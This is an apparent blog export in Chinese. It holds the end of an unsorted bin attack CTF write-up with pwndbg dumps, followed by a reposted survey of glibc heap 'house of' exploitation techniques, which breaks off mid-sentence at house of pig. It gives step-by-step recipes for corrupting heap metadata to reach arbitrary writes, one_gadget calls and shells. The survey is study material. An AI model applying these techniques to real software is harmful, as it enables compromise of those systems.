&lt;heaparray&gt;:\t0x0000000001a65010\t0x0000000000000000    \t\t\t\t\t\t\t\t\t\t#chunk1已经被free掉0x6020f0 &lt;heaparray+16&gt;:\t0x0000000001a65450\t0x0000000000000000\n\n溢出到目的位置通过对chunk 0 进行溢出 修改 chunk1 的 bk 指针，到magic-0x10的位置\npwndbg&gt; x/16gx 0x1a650000x1a65000:\t0x0000000000000000\t0x00000000000000210x1a65010:\t0x0000000000000000\t0x00000000000000000x1a65020:\t0x0000000000000000\t0x0000000000000421\t0x1a65030:\t0x0000000000000000\t0x00000000006020b0 // bk -&gt; magic - 0x10\n\n再申请一个 大小大于 small chunk 且 小与刚刚 释放的chunk 的大小的 chunk0x6020b0 &lt;stdin@@GLIBC_2.2.5&gt;:\t0x00007f9bd595b8e0\t0x00000000000000000x6020c0 &lt;magic&gt;:\t0x00007f9bd595bb78\t0x0000000000000000\n\n可以看到magic 已经被改成了0x00007f9bd595bb78，这个值是main_arena+88\n最后我们输入 4869 就可以打印flag 了\nflag{unsorted_bin_attack}\n","categories":["heap"],"tags":["unsoted bin attack"]},{"title":"Glibc堆利用之house of 系列","url":"/2023/11/25/Glibc%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse%20of%20%E7%B3%BB%E5%88%97/","content":"转载自Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.cn)\n1 - 前言Glibc 的 house of 系列攻击手法基于都是围绕着堆利用和 IO FILE 利用。还有很多堆利用手法也非常经典，但是由于其没有被冠以 house of xxxx，故没有收录到本文中。如果想学习所有的详细的堆攻击手法，强烈建议 follow 仓库 how2heap进行学习。我相信，只要把 how2heap 里面的每一个堆利用手法都学懂学透了，glibc 堆利用你将尽在掌握。\n在开始系列总结之前，我会给出一个表格，表格里面分别是 house of xxxx 和对应的优秀的解析文章，在此非常感谢各位师傅们的总结。如果你在阅读本文的过程中想完整地查看某一个手法地详细利用过程，那么可以直接回到表格，点击对应的链接进行学习。目前的最新版本为 2.37，但是，目前的 ubuntu:23.04 还没开始用 glibc-2.37，使用的仍然是 glibc-2.36。\n如果还有哪些 house of xxxx 的利用手法没有收录进来，或你对本文存有一些疑问，或者你发现本文某些内容编写错误，还请留言指正。\n需要注意的是，除了关注各种 house of 利用技巧本身，更重要的是，需要关注该利用技巧背后的思想和原理。如果你能从这一系列的利用手法中提炼出一些通用的攻击向量或者攻击思想，日后在面对其他的场景，你也能更快的找到系统的漏洞点并加以利用。学习 glibc 堆利用更多的是为了举一反三，为了更好地掌握漏洞挖掘模式、漏洞分析方法，而不仅仅是为了比赛。\nhouse of 系列的表格如下，适用版本不考虑低于 glibc-2.23 的版本。我将在下文中进一步阐述每一个利用手法的原理、使用场景与适用范围。\n\n\n\n攻击方法\n影响范围\n学习链接\n\n\n\nhouse of spirit\n2.23—— 至今\n堆利用系列之 house of spirit - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of einherjar\n2.23—— 至今\nPWN——House Of Einherjar CTF Wiki 例题详解 - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of force\n2.23——2.29\nTop chunk 劫持：House of force 攻击 - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of lore\n2.23—— 至今\nHouse of Lore - CTF Wiki (ctf-wiki.org)\n\n\nhouse of orange\n2.23——2.26\nHouse of orange - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of rabbit\n2.23——2.28\nhttp://p4nda.top/2018/04/18/house-of-rabbit/\n\n\nhouse of roman\n2.23——2.29\nHouse of Roman - CTF Wiki (ctf-wiki.org)\n\n\nhouse of storm\n2.23——2.29\nHouse of storm 原理及利用 - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of corrosion\n2.23—— 至今\nHouse-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com)\n\n\nhouse of husk\n2.23—— 至今\nhouse-of-husk 学习笔记 - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of atum\n2.26——2.30\nhttps://abf1ag.github.io/2021/06/11/house-of-atum/\n\n\nhouse of kauri\n2.26——2.32\nOverview of GLIBC heap exploitation techniques (0x434b.dev)\n\n\nhouse of fun\n2.23——2.30\nOverview of GLIBC heap exploitation techniques (0x434b.dev)\n\n\nhouse of mind\n2.23—— 至今\nhow2heap/house_of_mind_fastbin.c at master · shellphish/how2heap (github.com)\n\n\nhouse of muney\n2.23—— 至今\nHouse of Muney 分析 - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of botcake\n2.23—— 至今\n奇安信攻防社区 - 深入理解 House of Botcake 堆利用手法 (butian.net)\n\n\nhouse of rust\n2.26—— 至今\nc4ebt/House-of-Rust\n\n\nhouse of crust\n2.26——2.37\nc4ebt/House-of-Rust\n\n\nhouse of io\n2.26—— 至今\nOverview of GLIBC heap exploitation techniques (0x434b.dev)\n\n\nhouse of banana\n2.23—— 至今\nhouse of banana - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of kiwi\n2.23——2.36\nHouse OF Kiwi - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of emma\n2.23—— 至今\nhouse of emma\n\n\nhouse of pig\n2.23—— 至今\nhouse of pig 一个新的堆利用详解 - 安全客 - 安全资讯平台 (anquanke.com)\n\n\nhouse of obstack\n2.23—— 至今\n一条新的 glibc IO_FILE 利用链：_IO_obstack_jumps 利用分析 - 跳跳糖 (tttang.com)\n\n\nhouse of apple1\n2.23—— 至今\nHouse of Apple 一种新的 glibc 中 IO 攻击方法 (1) - roderick - record and learn! (roderickchan.cn)\n\n\nhouse of apple2\n2.23—— 至今\nHouse of Apple 一种新的 glibc 中 IO 攻击方法 (2) - roderick - record and learn! (roderickchan.cn)\n\n\nhouse of apple3\n2.23—— 至今\nHouse of Apple 一种新的 glibc 中 IO 攻击方法 (3) - roderick - record and learn! (roderickchan.cn)\n\n\nhouse of gods\n2.23——2.27\nhouse-of-gods/HOUSE_OF_GODS.TXT at master · Milo-D/house-of-gods (github.com)\n\n\n此外，阅读下文之前需要了解：\n\n下面所述的 chunk A，地址 A 指的是 chunk header 地址，而不是 user data 地址。\n漏洞成因基本上都是堆溢出、UAF 等\n\n2-house of 系列2.1-house of spirit漏洞成因堆溢出写\n适用范围\n2.23—— 至今\n\n利用原理利用堆溢出，修改 chunk size，伪造出 fake chunk，然后通过堆的释放和排布，控制 fake chunk。house of spirit 的操作思路有很多，比如可以按如下操作进行利用：\n\n申请 chunk A、chunk B、chunk C、chunk D\n对 A 写操作的时候溢出，修改 B 的 size 域，使其能包括 chunk C\n释放 B，然后把 B 申请回来，再释放 C，则可以通过读写 B 来控制 C 的内容\n\n相关技巧起初 house of spirit 主要是针对 fastbin，后来引入了 tcachebin 后，也可以使用 tcachebin 版本的 house of spirit。利用方法与 fastbin 场景下类似，注意好不同版本下的检查条件即可。\n利用效果\n劫持 fastbin/tcachebin 的 fd 之后，可以任意地址分配、任意地址读写\n\n2.2-house of einherjar漏洞成因溢出写、off by one、off by null\n适用范围\n2.23—— 至今\n可分配大于处于 unsortedbin 的 chunk\n\n利用原理利用 off by null 修改掉 chunk 的 size 域的 P 位，绕过 unlink 检查，在堆的后向合并过程中构造出 chunk overlapping。\n\n申请 chunk A、chunk B、chunk C、chunk D，chunk D 用来做 gap，chunk A、chunk C 都要处于 unsortedbin 范围\n释放 A，进入 unsortedbin\n对 B 写操作的时候存在 off by null，修改了 C 的 P 位\n释放 C 的时候，堆后向合并，直接把 A、B、C 三块内存合并为了一个 chunk，并放到了 unsortedbin 里面\n读写合并后的大 chunk 可以操作 chunk B 的内容，chunk B 的头\n\n相关技巧虽然该利用技巧至今仍可以利用，但是需要对 unlink 绕过的条件随着版本的增加有所变化。\n最开始的 unlink 的代码是：\n| 1 2 3 4 5 6 7 8 9 10 | /* Take a chunk off a bin list */ #define unlink(AV, P, BK, FD) {                                            \\    FD = P-&gt;fd;\t\t\t\t\t\t\t\t      \\    BK = P-&gt;bk;\t\t\t\t\t\t\t\t      \\    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))\t\t      \\      malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \\    else {\t\t\t\t\t\t\t\t      \\ \t// .....\t\t\t\t\t\t\t      \\      }\t\t\t\t\t\t\t\t\t      \\ } || ———————— | ———————————————————— ||                          |                                                              |\n只需要绕过__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0) 即可，因此，不需要伪造地址处于高位的 chunk 的 presize 域。\n高版本的 unlink 的条件是：\n新增了 chunksize (p) != prev_size (next_chunk (p))，对 chunksize 有了检查，伪造的时候需要绕过。\n利用效果\n构造 chunk overlap 后，可以任意地址分配\n结合其他方法进行任意地址读写\n\n例题例题：2016_seccon_tinypad2.3-house of force漏洞成因堆溢出写 top_chunk\n适用范围\n2.23——2.29\n可分配任意大小的 chunk\n需要泄露或已知地址\n\n利用原理对 top_chunk 的利用，过程如下：\n\n申请 chunk A\n写 A 的时候溢出，修改 top_chunk 的 size 为很大的数\n分配很大的 chunk 到任意已知地址\n\n相关技巧注意，在 glibc-2.29 后加入了检测，house of force 基本失效：\n\n利用效果\n任意地址分配\n任意地址读写\n\n2.4-house of lore漏洞成因堆溢出、use after free、edit after free\n适用范围\n2.23—— 至今\n需要泄露或已知地址\n\n利用原理控制 smallbin 的 bk 指针，示例如下：\n\n申请 chunk A、chunk B、chunk C，其中 chunk B 大小位于 smallbin\n释放 B，申请更大的 chunk D，使得 B 进入 smallbin\n写 A，溢出修改 B 的 bk，指向地址 X，这里有 fake chunk\n布置 X-&gt;fd == &amp;B\n分配两次后即可取出位于 X 地址处的 fake chunk\n\n相关技巧在引入了 tcache stash unlink 的时候，需要注意绕过：\n要么使其满足 tc_victim = last (bin)) == bin、要么使其满足：tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count。否则可能会因为非法内存访问使得程序 down 掉。\n实际上，这个技巧用得不是很多，因为在同等条件下，更偏向于利用 fastbin/tcachebin。\n利用效果\n任意地址分配\n任意地址读写\n\n2.5-house of orange漏洞成因堆溢出写\n适用范围\n2.23——2.26\n没有 free\n可以 unsortedbin attack\n\n利用原理house of orange 可以说是开启了堆与 IO 组合利用的先河，是非常经典、漂亮、精彩的利用组合技。利用过程还要结合 top_chunk 的性质，利用过程如下：\nstage1\n\n申请 chunk A，假设此时的 top_chunk 的 size 为 0xWXYZ\n写 A，溢出修改 top_chunk 的 size 为 0xXYZ（需要满足页对齐的检测条件）\n申请一个大于 0xXYZ 大小的 chunk，此时 top_chunk 会进行 grow，并将原来的 old top_chunk 释放进入 unsortedbin\n\nstage2\n\n溢出写 A，修改处于 unsortedbin 中的 old top_chunk，修改其 size 为 0x61，其 bk 为 &amp;_IO_list_all-0x10，同时伪造好 IO_FILE 结构\n申请非 0x60 大小的 chunk 的时候，首先触发 unsortedbin attack，将_IO_list_all 修改为 main_arena+88，然后 unsortedbin chunk 会进入到 smallbin，大小为 0x60；接着遍历 unsortedbin 的时候触发了 malloc_printerr，然后调用链为： malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp，调用到伪造的 vtable 里面的函数指针\n\n相关技巧\n在 glibc-2.24 后加入了 vtable 的 check，不能任意地址伪造 vatble 了，但是可以利用 IO_str_jumps 结构进行利用。\n在 glibc-2.26 后，malloc_printerr 不再刷新 IO 流了，所以该方法失效\n由于_mode 的正负性是随机的，影响判断条件，大概有 1/2 的概率会利用失败，多试几次就好\n\n利用效果\n任意函数执行\n任意命令执行\n\n2.6-house of rabbit漏洞成因堆溢出写、use after free、edit after free\n适用范围\n2.23——2.26\n超过 0x400 大小的堆分配\n可以写 fastbin 的 fd 或者 size 域\n\n利用原理该利用技巧的核心是 malloc_consolidate 函数，当检测到有 fastbin 的时候，会取出每一个 fastbin chunk，将其放置到 unsortedbin 中，并进行合并。以修改 fd 为例，利用过程如下：\n\n申请 chunk A、chunk B，其中 chunk A 的大小位于 fastbin 范围\n释放 chunk A，使其进入到 fastbin\n利用 use after free，修改 A-&gt;fd 指向地址 X，需要伪造好 fake chunk，使其不执行 unlink 或者绕过 unlink\n分配足够大的 chunk，或者释放 0x10000 以上的 chunk，只要能触发 malloc_consolidate 即可\n此时 fake chunk 被放到了 unsortedbin，或者进入到对应的 smallbin/largebin\n取出 fake chunk 进行读写即可\n\n相关技巧\n2.26 加入了 unlink 对 presize 的检查\n2.27 加入了 fastbin 的检查\n\n抓住重点：house of rabbit 是对 malloc_consolidate 的利用。因此，不一定要按照原作者的思路来，他的思路需要满足的条件太多了。\n利用效果\n任意地址分配\n任意地址读写\n\n2.7-house of roman漏洞成因use after free、堆溢出\n适用范围\n2.23——2.29\n可以 use after edit\n不需要泄露地址\n需要爆破 12 bit，成功的概率 1/4096\n\n利用原理可以说这个技巧是 fastbin attack + unsortedbin attack 的组合技，利用思路如下：\n\n申请 chunk A、chunk B、chunk C 和 chunk D，chunk B 的大小为 0x70\n释放 chunk B，使其进入到 fastbin[0x70]\n溢出写 A，修改 chunk B 的 size，使其大小在 unsortedbin 范围\n再次释放 B，B 进入 unsortedbin 中\n部分写 B 的 fd，使得 fd 指向 malloc_hook-0x23\n利用 A 的溢出写修正 B 的 size，连续分配两次 0x70，即可分配到 malloc_hook 上方\n触发 unsortedbin attack，将__malloc_hook 写为 main_arena+88\n部分写__malloc_hook 的低三个字节，修改为 one_gadget\n再次 malloc 即可拿到 shell\n\n相关技巧\n使用 house of roman 的时候，需要采用多线程爆破\n可以使用其他方法代替，比如先攻击 stdout 泄露地址，使得爆破的成本降低\n\n利用效果\n执行 one_gadget\n绕过 ASLR\n\n2.8-house of storm漏洞成因堆溢出、use after free、edit after free\n适用范围\n2.23——2.29\n可以进行 unsortedbin attack\n可以进行 largebin attack，修改 bk 和 bk_nextsize\n可以分配 0x50 大小的 chunk\n\n利用原理house of storm 也是一款组合技，利用开启了 PIE 的 x64 程序的堆地址总是 0x55xxxx... 或者 0x56xxxx... 开头这一特性，使用一次 largebin attack 写两个堆地址，使用一次 unsortedbin attack 写一次 libc 地址，可以实现任意地址分配。虽然 house of storm 最后能达到任意地址分配，但是由于其所需的条件比较多，一般可以用其他更简便的堆利用技术代替。利用思路如下：\n\n进行一次 unsortedbin attack，其 bk 修改为 addr\n进行一次 largebin attack，其 bk 修改为 addr+0x10，bk_nextsize 修改为 addr-0x20+3\n申请 0x50 大小的 chunk 即可申请到 addr 处\n\n相关技巧需要注意的有：\n\n该方法成功的几率是 50%，因为 0x55 会触发 assert 断言，0x56 才能成功\n申请 addr 处的 chunk 的时候需要从 unsortedbin 里面取\n\n利用效果\n任意地址分配\n\n2.9-house of corrosion漏洞成因堆溢出、use after free\n适用范围\n2.23—— 至今\n任意大小分配\n可以修改 global_max_fast\n不需要泄露地址\n\n利用原理一个非常 tricky 的方法，可以绕过 aslr，不需要泄露地址都能达成 rce，可以很很多方法结合起来应用。先说利用原理：\n\n使用 unsortedbin attack/largebin attack 等方法，成功修改 global_max_fast 的值为很大的值。如果使用 unsortedbin attack，不需要泄露地址，爆破 1/16 即可\n申请任意大小的 chunk，这些 chunk 都会被视为 fastbin chunk，然后利用这些 chunk 来进行读和写\n\n此时的计算公式为：\nchunk size = (chunk addr - &amp;main_arena.fastbinsY) x 2 + 0x20\n\n读原语：\n\n假设对应的地址 X 上存储着 Y，现在的目的是泄露出 Y\n根据偏移计算出来 chunk size，修改 chunk A 的 size 为计算出来的值，释放 chunk A 到地址 X 处\n此时，A-&gt;fd 就被写入了 Y\n通过打印即可泄露出 Y 的信息\n\n写原语 1：\n\n假设对应的地址 X 上存储着 Y，现在的目的是修改地址 X 存储的 Y 为其他值\n根据偏移计算出来 chunk size，修改 chunk A 的 size 为计算出来的值，释放 chunk A 到地址 X 处\n此时，A-&gt;fd 就被写入了 Y\n修改 A-&gt;fd 为目标值\n分配一次 chunk A 就可以把地址 X 存储的值为任意值\n\n写原语 2：\n\n假设地址 X 上存储着 Y、地址 M 上存储着 N，现在的目的是把 N 写到地址 X 处\n根据偏移计算 chunk size1，先释放 chunk A 到地址 X 处，此时有地址 X 处存储 chunk A 地址，chunk A-&gt;fd 为 Y\n根据偏移计算 chunk size2，再次释放 chunk A 到地址 M 处，此时有地址 M 处存储 chunk A 地址，chunk A-&gt;fd 为 N\n修正 chunk A 的大小为 chunk size1，分配 1 次 chunk 即可使得 N 转移到地址 X 处，当然在转移的过程中可以适当的修改 N\n\n显然，借助写原语 2，即可在不需要泄露地址的前提下将__malloc_hook 等写为 one_gadget，爆破的概率是 1/4096。\n相关技巧\n虽然至今都能使用 house of corrosion，但是在 glibc-2.37 版本中，global_max_fast 的数据类型被修改为了 int8_u，进而导致可控的空间范围大幅度缩小。\nhouse of corrosion 也可以拓展到 tcachebin 上\n适当控制 global_max_fast 的大小，把握控制的空间范围\n可以和 IO_FILE 结合起来泄露信息\n\n利用效果\nglibc 上的地址泄露\n执行 one_gadget\n\n2.10-house of husk漏洞成因堆溢出\n适用范围\n2.23—— 至今\n可以修改__printf_arginfo_table 和__printf_function_table\n可触发格式化字符串解析\n\n利用原理严格来说，这个漏洞是与堆的关系并不是很大，主要是根据 printf 的机制进行利用。但是，该技术可以和很多堆利用手法结合起来。\n调用处 1：\n利用方式为：\n\n__printf_function_table 和__printf_arginfo_table 分别写为 chunk A 和 chunk B 的地址\n设占位符为 α，此时 chunk B 的内容应该为 p64(0) x ord(α-2) + p64(one_gadget)\n\n调用处 2：\n利用方式为：\n\n__printf_function_table 和__printf_arginfo_table 分别写为 chunk A 和 chunk B 的地址\n设占位符为 α，此时 chunk A 的内容应该为 p64(0) x ord(α-2) + p64(one_gadget)\n\n该处调用在高版本被删除。\n相关技巧\n该技巧一般和 largebin attack 结合起来\n在低于 2.36 版本中，__malloc_assert 中有格式化字符串的解析\n还有一个__printf_va_arg_table 也是可以利用的，但是条件比较苛刻\n\n利用效果\n执行 one_gadget\n执行 rop 控制程序执行流\n\n2.11-house of atum漏洞成因edit after free\n\n适用范围\n2.26——2.30\n可以修改 tcachebin 的 next 和 key\n\n利用原理这是一个关于 tcachebin 的技巧，用于修改 chunk presize/size，利用过程如下：\n\n申请 chunk A，大小在 fastbin 范围内\n释放 A，连续释放 8 次，此时，A 的 fd 被清 0，A 也被放置到了 fastbin 里面\n申请一个 chunk，将其 fd 修改为 A - 0x10，此时 tcache 中的 counts 为 6\n再申请一个 chunk，从 fastbin 里面取，但是会把 fastbin 里面剩余的一个 chunk 链入到 tcachebin\n再次分配就会分配到地址 A-0x10 处，就可以修改原来 A 的 presize/size 等\n\n相关技巧\n2.30 之后逻辑变了，原来是判断 entry[idx]!=NULL，2.31 之后判断 count[idx] &gt; 0\n有时候需要绕过 tcache-&gt;key 的检测\n\n利用效果\n修改 chunk size 以及 chunk presize\n\n2.12-house of kauri漏洞成因堆溢出\n适用范围\n2.26——2.32\n\n利用原理利用原理很简单，修改 tcachebin 的 size，然后使其被放到不同大小的 tcachebin 链表里面去。我感觉这个技巧是很基础的 tcachebin 技巧，甚至不应该被称之为 house of。\n相关技巧\n无\n\n利用效果\n多个 tcachebin 链表中存放同一个 chunk\n\n2.13-house of fun漏洞成因堆溢出、use after free\n适用范围\n2.23——2.30\n可以申请 largebin 范围的 chunk\n\n利用原理或许这个技巧应该叫做 largebin attack。\n在这个 sourceware.org Git - glibc.git/blobdiff - malloc/malloc.ccommit 被检测了：\n\n相关技巧\n无\n\n利用效果\n任意地址写堆地址\n\n2.14-house of mind漏洞成因堆溢出\n适用范围\n2.23—— 至今\n可以分配任意大小的 chunk\n\n利用原理主要利用的是：\n\n\n\n1 2 3 4 \n#define heap_for_ptr(ptr) \\  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1))) #define arena_for_chunk(ptr) \\  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)\n\n\n\n\n\n\n\n如果是 non-mainarean 的 chunk，会根据其地址找到 heapinfo，然后找到 malloc_state 结构体。\n因此，利用技巧是：\n\n根据要释放的 fastbin chunk A 的堆地址，找到对应的 heap_for_ptr 地址\n在 heapinfo 地址处伪造好相关变量，重点是 mstate 指针\n修改 chunk A 的 non-main 标志位，释放到伪造的 arena 里面，控制好偏移即可\n\n相关技巧\n一般来说，可以分配任意大小的 chunk，还能堆溢出，很多技巧都能用\n这个技巧是希望大家关注对于 arena 的攻击\n甚至可以直接修改 thread_arena 这个变量\n\n利用效果\n任意地址写堆地址\n\n2.15-house of muney漏洞成因堆溢出\n适用范围\n2.23—— 至今\n能分配 mmap 的 chunk\n能修改 mmap 的 chunk 的大小\n\n利用原理这个技巧被称之为 steal heap from glibc。主要的点有以下几个：\n\nlibc.so.6 映射的地址空间，前面都是与符号表、哈希表、字符串表等重定位或者解析函数地址有关，前面一段的权限是 r--\nmmap(NULL, ...) 是会分配到 libc.so.6 的上方的\n\n基于这两个知识点，利用过程如下：\n\n申请 chunk A，假设为 0x40000 大小，则会走 mmap 申请，并且申请到 libc.so.6 的上方\n修改 chunk A 的大小为 0x45000，设置 MMAP 标志位\n释放 chunk A，则会把 libc.so.6 的 0x5000 的内存也释放掉\n再次申请 0x45000，就可以控制 libc.so.6 原来的符号表、哈希表等等\n触发一次 dl_runtime_resolve 等就能控制程序执行任意代码\n\n相关技巧\n需要伪造的符号表、哈希表等需要逐步调试\n可以扩展为 steal heap from everywhere\n\n利用效果\n任意代码执行\n\n2.16-house of botcake漏洞成因double free\n\n适用范围\n2.26—— 至今\n多次释放 chunk 的能力\n\n利用原理该技巧可以用于绕过 tcache-&gt;key 的检查，利用过程如下：\n\n申请 7 个大小相同，大小大于 0x80 的 chunk，再申请三个，分别为 chunk A 和 chunkB 和 chunk C\n释放前 7 个和 chunk A，前面 7 个都会进入到 tcachebin 里面，chunk A 进入到 unsortedbin\n释放 chunk B，则 chunk B 会和 chunk A 合并\n从 tcachebin 分配走一个\n再次释放 chunk B，此时 B 同时存在与 unsortedbin 和 tcachebin\n\n相关技巧\n在高版本需要绕过指针保护的检查\n\n利用效果\n构造出堆重叠，为后续利用做准备\n\n2.17-house of rust漏洞成因堆溢出\n适用范围\n2.26—— 至今\n可以进行 tcache stash unlinking 攻击\n可以进行 largebin attack\n不需要泄露地址\n\n利用原理原作者的博客写得很复杂，我这里提炼出关键信息。该技巧就是 tcachebin stash unlinking+largebin attack 的组合技巧。\n首先需要知道 tcachebin stash unlinking，下面称之为 TSU 技巧：\n\ntcachebin[A] 为空\nsmallbin[A] 有 8 个\n修改第 8 个 smallbin chunk 的 bk 为 addr\n分配 malloc(A) 的时候，addr+0x10 会被写一个 libc 地址\n\n还要知道 tcachebin stash unlinking+，下面称之为 TSU+ 技巧：\n\ntcachebin[A] 为空\nsmallbin[A] 有 8 个\n修改第 7 个 smallbin chunk 的 bk 为 addr，还要保证 addr+0x18 是一个合法可写的地址\n分配 malloc(A) 的时候，addr 会被链入到 tcachebin，也就是可以分配到 addr 处\n\n以 0x90 大小的 chunk 为例，此时的 tcache_key 还是指向 tcache_perthread_struct + 0x10 的：\n\n第一步，把 tcachebin[0x90] 填满，把 smallbin[0x90] 也填满\n第二步，把最后一个 smallbin 0x90 的 chunk 的 size 改成 0xb0，将其释放到 tcachebin[0xb0]，这一步主要是为了改变其 bk 指向 tcache_perthread_struct + 0x10，可以部分修改低位的字节，以便下一步分配到目标区域\n第三步，使用 largebin attack 往上一步的 bk-&gt;bk 写一个合法地址，然后耗尽 tcachebin[0x90]，再分配的时候就会触发 TSU+，之后就能分配到 tcache_perthread_struct 结构体\n第四步，还是堆风水，但是用 TSU 技术，在 tcache_perthread_struct 上写一个 libc 地址（比前面一步要简单很多）\n第五步，通过控制 tcache_perthread_struct 结构体，部分写上面的 libc 地址，分配到 stdout 结构体，泄露信息\n第六步，通过控制 tcache_perthread_struct 结构体分配到任意地址\n\n上面的过程最好的情况下需要爆破 1/16，最差 1/256。\n但是，2.34 之后，tcache_key 是一个随机数，不是 tcache_perthread_struct + 0x10 了。\n所以，此时可以加上 largebin attack，把以上的第二步变为：继续用 largebin attack 向其 bk 写一个堆地址，然后还要部分写 bk 使其落在 tcache_perthread_struct 区域。其他步骤一样。\n或者，在 smallbin 里面放 9 个，这样第 8 个的 bk 肯定就是一个堆地址。此时就需要爆破 1/16 的堆，1/16 的 glibc 地址，成功的概率是 1/256。\n相关技巧\n总的来说，就是利用 tcachebin stash unlinking 打 tcache_perthread_struct\n利用 largebin attack 构造合法地址\n\n利用效果\n任意地址分配\n任意函数执行\n\n2.18-house of crust漏洞成因堆溢出\n适用范围\n2.26——2.37\n可以进行 tcache stash unlinking 攻击\n可以进行 largebin attack\n不需要泄露地址\n\n利用原理其他步骤和上面的 house of rust 一样，但是到第五步的时候，去修改 global_max_fast\n后面的步骤和 house of corrosion 是一样的，通过写原语打 stderr 修改 one_gadget 拿到 shell。\n相关技巧\nhouse of crust = house of corrosion + house of rust\n2.37 之后，house of corrosion 使用受限\n\n2.19-house of io漏洞成因堆溢出\n适用范围\n2.26—— 至今\n\n利用原理其他博客上对该方法的介绍如下：\n\n\n\n1 \nThe tcache_perthread_object is allocated when the heap is created. Furthermore, it is stored right at the heap's beginning (at a relatively low memory address). The safe-linking mitigation aims to protect the fd/next pointer within the free lists. However, the head of each free-list is not protected. Additionally, freeing a chunk and placing it into the tcachebin also places a non-protected pointer to the appropriate tcache entry in the 2nd qword of a chunks' user data. The House of IO assumes one of three scenarios for the bypass to work. First, any attacker with a controlled linear buffer underflow over a heap buffer, or a relative arbitrary write will be able to corrupt the tcache. Secondly, a UAF bug allowing to read from a freed tcache eligible chunk leaks the tcache and with that, the heap base. Thirdly, a badly ordered set of calls to free(), ultimately passing the address of the tcache itself to free, would link the tcache into the 0x290 sized tcachebin. Allocating it as a new chunk would mean complete control over the tcache's values.\n\n\n\n\n\n\n\n可以看出来，其实就是对 tcache_perthread_struct 结构体的攻击，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个 tcache 的分配。\n相关技巧\n围绕 tcache_perthread_struct 进行攻击\n\n利用效果\n任意地址分配\n\n2.20-house of banana漏洞成因堆溢出\n适用范围\n2.23—— 至今\n可以进行 largebin attack\n能执行 exit 函数\n\n利用原理首先是 largebin attack 在高版本只能从下面这个分支利用：\n也就是，双链表里面至少存在一个 largebin chunk，且目前要入链的 chunk 比最小的还小，修改了 bk_nextsize 之后就会触发。可以造成任意地址写堆地址。\n然后是 exit 调用的时候，会调用到_dl_fini 函数，执行每个 so 中注册的 fini 函数：\n可以触发 call 的有两个点，第一个点可以 call 到很多指针，是一个数组；另一个点就只有一个函数。\n剩下的工作就是根据代码绕过检测，调用到调用点。\n所以，利用的思路有：\n\n直接伪造_rtld_global 的_ns_loaded，布局好其他内容，使其调用到 fini_array\n伪造 link_map 的 next 指针，布局好其他内容，使其调用到 fini_array\n修改 link_map-&gt;l_addr，根据偏移使其调用到指定区域的函数\n\n相关技巧\n伪造 fini_array 数组的时候，是从后往前遍历的\n有时候远程的 rtld_global 的偏移与本地不一样，需要爆破\n如果不想逐个伪造，可以直接用 gdb 从内存里面 dump 出来，然后基于偏移修改内存即可\n\n利用效果\n任意代码执行\n\n2.21-house of kiwi漏洞成因堆溢出\n适用范围\n2.23——2.36\n在 malloc 流程中触发 assert\n\n利用原理主要是提供了一种在程序中调用 IO 流函数的思路：\n可以看到，调用到了 fxprintf 和 fflush。\n至于原 house of kiwi 所提到的控制 rdx 的思路，在很多版本中无法使用，因为 IO_jumps_table 都是不可写的，故此处不再详述。\n相关技巧\n在 2.36 之后，__malloc_assert 被修改为：\n\n\n\n\n1 2 3 4 5 6 7 8 9 \n_Noreturn static void __malloc_assert (const char *assertion, const char *file, unsigned int line, \t const char *function) {  __libc_message (do_abort, \"\\ Fatal glibc error: malloc assertion failure in %s: %s\\n\", \t  function, assertion);  __builtin_unreachable (); }\n\n\n\n\n\n\n\n而在 2.37 该函数直接被删掉了。\n\n如果 stderr 在 libc 上，需要修改调 stderr 处的指针，也有可能在程序的地址空间上\n\n伪造的技巧如下，触发 fxprintf(stderr，......)：\n| 1 2 3 4 5  | flags &amp; 0x8000的话，不用伪造_lock flags &amp; ~(0x2 | 0x8) 必须成立，避免走到unbuffered的流程 mode 设置为0 vtable默认调用的是偏移0x38的函数，如果想劫持为_IO_xxx_overflow，需要设置为_IO_xxx_jumps-0x20 flags 可以设置为\"  sh||\"，前面有两个空格，此时还需要设置_lock，不想设置_lock的时候，flags可以为\"\\x20\\x80;sh||\" || ———— | ———————————————————— ||              |                                                              |\n\n\n利用效果\n触发 IO 处理流程，为后续利用做准备\n\n2.22-house of emma漏洞成因堆溢出\n适用范围\n2.23—— 至今\n可以进行两次 largebin attack\n或者可以进行两次任意地址写堆地址\n可以触发 IO 流操作\n\n利用原理在_IO_cookie_jumps 中存在一些_IO_cookie_read 等函数，如下：\n可以看到有函数指针的调用。但是对函数指针使用 pointer_guard 进行了加密：\n循环右移后，再异或。\n因此，利用思路如下：\n\n截至某个 IO_FILE 的指针（IO_list_all/stdxxx-&gt;chain 等都可以）为堆地址\n堆上伪造 IO_FILE 结构，其 vtable 替换为_IO_cookie_jumps+XX，XX 为一个偏移量\n伪造好函数指针和调用参数，指针需要循环异或和加密\n调用到_IO_cookie_read 等函数，进而执行任意函数\n\n相关技巧\n常用的 gadget 有：\npointer_guard 就在 canary 下面，偏移可能需要爆破\n\n利用效果\n任意函数执行\n\n2.23-house of pig漏洞成因堆溢出\n适用范围\n2.23—— 至今\n可以进行 largebin attack\n可以触发 IO 流操作\n\n利用原理在_IO_str_jumps 中，存在着_IO_str_overflow 函数：\n从函数中就能看到，利用流程如下：\n\n伪造 IO_FILE 